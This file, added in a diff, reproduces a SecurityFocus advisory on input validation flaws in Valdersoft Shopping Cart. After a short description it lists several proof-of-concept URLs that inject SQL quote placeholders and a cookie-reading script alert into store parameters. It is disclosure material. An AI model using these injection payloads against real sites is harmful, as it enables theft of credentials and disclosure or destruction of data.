@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/12916/info
+
+Multiple input validation vulnerabilities reportedly affect Valdersoft Shopping Cart. These issues are due to a failure of the application to properly sanitize user-supplied input prior to using it to carry out critical actions.
+
+An attacker may leverage these issues to carry out cross-site scripting and SQL injection attacks against the affected application. This may result in the theft of authentication credentials, destruction or disclosure of sensitive data, and potentially other attacks. 
+
+http://www.example.com/store/category.php?sid=CDFE279AC2AD08522DF1CF9B46475132&id='SQL_INJECTION
+
+http://www.example.com/store/item.php?si d=CDFE279AC2AD08522DF1CF9B46475132&id='SQL_INJECTION
+
+http://www.example.com/store/index.php?sid=CDFE279AC2AD08522DF1CF9B46475132&lang='SQL_INJECTION
+
+http://www.example.com/store/ search_result.php?sid=&searchTopCategoryID=&searchQuery='SQL_INJECTION&sid=CDFE279AC2AD08522DF1CF9B46475132&currency=USD
+
+http://www.example.com/store/search_result.php?sid= CDFE279AC2AD08522DF1CF9B46475132&searchTopCategoryID='SQL_INJECTION&searchQuery=&sid=CDFE279AC2AD08522DF1CF9B46475132&currency=USD
+
+http://www.example.com/store/index.php?sid=CDFE279AC2AD08522DF1CF9B46475132&lang=%22%3E%3Cscript%3Ealert(docum ent.cookie)%3C/script%3E
+
+http://www.example.com/store/search_result.php?sid=CDFE279AC2AD08522DF1CF9B46475132&searchTopCategoryID=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&searchQuery=&sid=CDFE279AC2AD08522DF1CF9B46475132&currency=USD 
